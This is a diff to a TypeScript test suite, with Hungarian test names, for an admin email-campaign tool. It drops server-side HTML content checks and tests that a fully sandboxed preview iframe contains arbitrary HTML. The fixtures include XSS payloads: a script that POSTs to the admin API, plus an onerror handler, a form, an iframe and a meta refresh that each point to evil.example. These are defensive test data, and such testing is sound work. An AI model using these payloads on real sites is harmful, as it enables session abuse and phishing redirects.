@@ -16,12 +16,12 @@ import { EmailStoreError, MemoryEmailStore, PostgresEmailStore } from '../src/se
 import type { SupabaseClient } from '@supabase/supabase-js';
 import { ApiError } from '../src/client/lib/api';
 import {
-  EmailCenterService, EmailSendError, MAX_ATTEMPTS, ResendSender, adminEmailRouter, contentIssues, emailConfig, emailRouter, finalStatus,
+  EmailCenterService, EmailSendError, MAX_ATTEMPTS, ResendSender, adminEmailRouter, campaignIssues, emailConfig, emailRouter, finalStatus,
   missingConfig, renderEmail, unsubscribeToken, verifyUnsubscribeToken, type EmailSender, type OutgoingEmail,
 } from '../src/server/email/emailCenter';
 import { requireAdmin } from '../src/server/billing/entitlement';
 import { CONSENT_TEXT_VERSION, type CampaignView } from '../src/shared/email';
-import { CampaignRow, errorText, sendBlockers } from '../src/client/pages/AdminEmailCenter';
+import { CampaignRow, EmailPreviewFrame, errorText, sendBlockers } from '../src/client/pages/AdminEmailCenter';
 
 const ADMIN = { user: 'aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa', email: 'admin@example.com' };
 const U = (n: number) => `00000000-0000-4000-8000-${String(n).padStart(12, '0')}`;
@@ -305,17 +305,21 @@ describe('Marketing és rendszerüzenet elkülönítése', () => {
     expect((await call(h, 'PUT', `/api/admin/email/campaigns/${c.id}`, ADMIN, { audience: 'marketing_consent' })).status).toBe(400);
   });
 
-  it('rendszerüzenetben marketingelem: az előnézet jelzi, a küldés 422 – szóeleji illeszkedés („tranzakció” nem akció)', async () => {
-    expect(contentIssues('system', 'all', 'Fiókbiztonság', '<p>Sikeres tranzakció a fiókodon.</p>')).toEqual([]);
-    const promo = contentIssues('system', 'all', 'Nagy AKCIÓ!', '<p>20% kedvezmény</p>')[0];
-    expect(promo).toMatch(/kedvezmény/);
-    expect(promo).toMatch(/akció/);
-    const c = (await create({ kind: 'system', subject: 'Black Friday', html: '<p>Kupon: TIPP20</p>' })).body as CampaignView;
+  it('nincs automatikus tartalomvizsgálat: marketinges szöveg rendszerüzenetben sem akadályozza az előnézetet, a tesztet és a küldést', async () => {
+    expect(campaignIssues('system', 'all')).toEqual([]);
+    expect(campaignIssues('marketing', 'marketing_consent')).toEqual([]);
+    expect(campaignIssues('system', 'marketing_consent')).toHaveLength(1); // címzettszabály, nem tartalom
+    const c = (await create({ kind: 'system', subject: 'Black Friday – nagy AKCIÓ!', html: '<p>20% kedvezmény, kupon: TIPP20, vásárolj most!</p>' })).body as CampaignView;
     const p = (await preview(c.id)).body;
-    expect(p.issues.length).toBeGreaterThan(0);
-    const r = await send(c.id, { recipientCount: p.recipientCount, attestSystem: true });
-    expect(r.status).toBe(422);
-    expect(h.sender.calls).toHaveLength(0);
+    expect(p.issues).toEqual([]);
+    expect(p.recipientCount).toBe(7);
+    expect((await call(h, 'POST', `/api/admin/email/campaigns/${c.id}/test`, ADMIN, {})).status).toBe(200);
+    expect(sendBlockers({ campaign: c, preview: p, kind: 'system', sendingConfigured: true })).toEqual([]);
+    // a besorolás a választott típus: rendszerüzenetként megy ki, leiratkozó link nélkül, a nyilatkozat továbbra is kötelező
+    expect((await send(c.id, { recipientCount: p.recipientCount })).body.code).toBe('ATTESTATION_REQUIRED');
+    expect((await send(c.id, { recipientCount: p.recipientCount, attestSystem: true })).status).toBe(202);
+    expect((await settle(c.id))?.status).toBe('sent');
+    for (const e of h.sender.sent.filter((x) => !x.subject.startsWith('[TESZT]'))) { expect(e.headers).toBeUndefined(); expect(e.html).toContain('szolgáltatási üzenet'); }
   });
 
   it('rendszerüzenet csak az admin nyilatkozatával küldhető', async () => {
@@ -342,10 +346,19 @@ describe('Marketing és rendszerüzenet elkülönítése', () => {
     }
   });
 
-  it('veszélyes tartalom (script, eseménykezelő, javascript:) nem küldhető', () => {
-    for (const html of ['<script>x</script>', '<img src=x onerror="a()">', '<a href="javascript:alert(1)">x</a>', '<iframe src=x>']) {
-      expect(contentIssues('marketing', 'all', 'T', html).length, html).toBeGreaterThan(0);
+  it('a HTML-t a szerver nem elemzi: tetszőleges HTML-lel is van előnézet és indítható a küldés (a hozzájárulás feltétele marad)', async () => {
+    await consent(1);
+    for (const html of ['<script>x</script>', '<img src=x onerror="a()">', '<a href="javascript:void(0)">x</a>', '<iframe src=x></iframe>', '<img src="https://example.com/banner.png">']) {
+      const c = (await create({ html })).body as CampaignView;
+      const p = (await preview(c.id)).body;
+      expect(p.issues, html).toEqual([]);
+      expect(p.recipientCount, html).toBe(1);
     }
+    const c = (await create({ html: '<img src="https://example.com/banner.png">' })).body as CampaignView;
+    const r = await send(c.id, { recipientCount: 1 });
+    expect(r.status).toBe(202);
+    expect((await settle(c.id))?.status).toBe('sent');
+    expect(recipientsOf()).toEqual(['u1@example.com']);
   });
 });
 
@@ -565,11 +578,11 @@ describe('Kampányküldés a felület útján (mentés → előnézet → címze
     expect(h.sender.calls).toHaveLength(0);
   });
 
-  it('akadályok: mentetlen, tartalmi hiba, beállítás hiánya, korlát – mindegyik megnevezve', () => {
+  it('akadályok: mentetlen, beállítási hiba, küldés beállításának hiánya, korlát – mindegyik megnevezve', () => {
     const p = { html: '', recipientCount: 3, maxRecipients: 5000, issues: [] as string[] };
     const draft = { id: 'c1', status: 'draft' } as CampaignView;
     expect(sendBlockers({ campaign: null, preview: p, kind: 'marketing', sendingConfigured: true })).toEqual(['Előbb mentsd el a kampányt.']);
-    expect(sendBlockers({ campaign: draft, preview: { ...p, issues: ['x'] }, kind: 'system', sendingConfigured: true })[0]).toMatch(/tartalmi hibákat/);
+    expect(sendBlockers({ campaign: draft, preview: { ...p, issues: ['x'] }, kind: 'system', sendingConfigured: true })[0]).toMatch(/beállítási hibát/);
     expect(sendBlockers({ campaign: draft, preview: p, kind: 'marketing', sendingConfigured: false })[0]).toMatch(/nincs beállítva/);
     expect(sendBlockers({ campaign: draft, preview: { ...p, recipientCount: 6000 }, kind: 'marketing', sendingConfigured: true })[0]).toMatch(/meghaladja/);
     // ismeretlen beállítási állapot (a státusz még tölt) nem tilt – a szerver úgyis ellenőriz
@@ -636,6 +649,66 @@ describe('Előnézet: adatbázis-hiba a címzettlista lekérésekor („A művel
       .toBe('Nem sikerült: a címzettlista lekérése. (HTTP 503, EMAIL_DB_ERROR, adatbázis-kód: 42501)');
     expect(errorText(new ApiError('A kampány nem található.', 404, 'NOT_FOUND', {}))).toBe('A kampány nem található. (HTTP 404, NOT_FOUND)');
     expect(errorText('x')).toBe('Ismeretlen hiba.');
+  });
+});
+
+describe('Szabad HTML: biztonság a megjelenítésben, nem a tartalom tiltásával', () => {
+  const ATTACK = '<script>parent.document.title="x";fetch("/api/admin/email/campaigns",{method:"POST"})</script>'
+    + '<img src="x" onerror="top.location=&quot;https://evil.example&quot;"><form action="https://evil.example"><input name=a></form>'
+    + '<a href="javascript:alert(1)" target="_top">katt</a><iframe src="https://evil.example"></iframe><meta http-equiv="refresh" content="0;url=https://evil.example">';
+
+  it('az előnézeti keret teljes sandbox: egyetlen engedély sincs (nincs allow-scripts / allow-same-origin / allow-top-navigation / allow-forms / allow-popups)', () => {
+    const html = renderToStaticMarkup(createElement(EmailPreviewFrame, { html: ATTACK }));
+    expect(html).toMatch(/^<iframe [^>]*sandbox=""[^>]*><\/iframe>$/);
+    expect(html).not.toMatch(/allow-/i);
+    // a levél HTML-je CSAK a keret srcdoc attribútumában, attribútumként escape-elve – a felület DOM-jába nem kerül
+    expect(html).toContain('srcDoc="&lt;script&gt;parent.document.title=');
+    expect(html.match(/<[a-z]/gi)).toEqual(['<i']); // az egyetlen valódi elem az iframe
+  });
+
+  it('a levél HTML-je változatlanul jut az előnézetbe és a Resendhez (nincs átírás, nincs tartalmi tiltás); a keret a szerver sablonja', async () => {
+    await consent(1);
+    const c = (await create({ html: ATTACK })).body as CampaignView;
+    const p = (await preview(c.id)).body;
+    expect(p.issues).toEqual([]);
+    expect(p.html).toContain(ATTACK);
+    expect((await send(c.id, { recipientCount: p.recipientCount })).status).toBe(202);
+    await settle(c.id);
+    expect(h.sender.sent).toHaveLength(1);
+    expect(h.sender.sent[0].html).toContain(ATTACK);
+    // a fejlécek és a címzett a szerver értékei – a levél tartalma nem befolyásolja őket
+    expect(h.sender.sent[0].to).toBe('u1@example.com');
+    expect(Object.keys(h.sender.sent[0].headers ?? {}).sort()).toEqual(['List-Unsubscribe', 'List-Unsubscribe-Post']);
+  });
+
+  it('a tárgy a sablon <title>-jében escape-elve (a tárgy nem törhet ki a dokumentumfejből), a tartalom érintetlen', () => {
+    const out = renderEmail('marketing', '</title><script>x</script>', '<b>t</b>', 'https://x/u?t=1');
+    expect(out).toContain('<title>&lt;/title&gt;&lt;script&gt;x&lt;/script&gt;</title>');
+    expect(out).toContain('<b>t</b>');
+  });
+
+  it('a megerősítés és a címzettszabályok szabad HTML mellett sem kerülhetők meg', async () => {
+    await consent(1);
+    h.store.users.push({ userId: U(31), email: 'nincs-megerositve@example.com', status: 'free', end: null, confirmed: false });
+    h.store.consents.set(U(31), { consented: true, consentedAt: '2026-11-01T10:00:00.000Z', consentSource: 'profile', revokedAt: null });
+    const c = (await create({ html: ATTACK })).body as CampaignView;
+    // előnézet (szerver által számolt címzettszám) nélkül / eltérő számmal nincs küldés
+    expect((await send(c.id, {})).body.code).toBe('COUNT_CHANGED');
+    expect((await send(c.id, { recipientCount: 99 })).body.code).toBe('COUNT_CHANGED');
+    // nem admin nem indíthat küldést
+    expect((await call(h, 'POST', `/api/admin/email/campaigns/${c.id}/send`, as(1), { recipientCount: 1 })).status).toBe(403);
+    expect(h.sender.calls).toHaveLength(0);
+    const p = (await preview(c.id)).body;
+    expect(p.recipientCount).toBe(1); // csak a megerősített, hozzájáruló cím
+    expect((await send(c.id, { recipientCount: 1 })).status).toBe(202);
+    await settle(c.id);
+    expect((await send(c.id, { recipientCount: 1 })).body.code).toBe('ALREADY_PROCESSED');
+    expect(recipientsOf()).toEqual(['u1@example.com']);
+    // rendszerüzenet: a nyilatkozat szabad HTML mellett is kötelező
+    const sys = (await create({ kind: 'system', html: ATTACK })).body as CampaignView;
+    const sp = (await preview(sys.id)).body;
+    expect((await send(sys.id, { recipientCount: sp.recipientCount })).body.code).toBe('ATTESTATION_REQUIRED');
+    expect((await send(sys.id, { recipientCount: sp.recipientCount, attestSystem: 'true' })).body.code).toBe('ATTESTATION_REQUIRED');
   });
 });
 
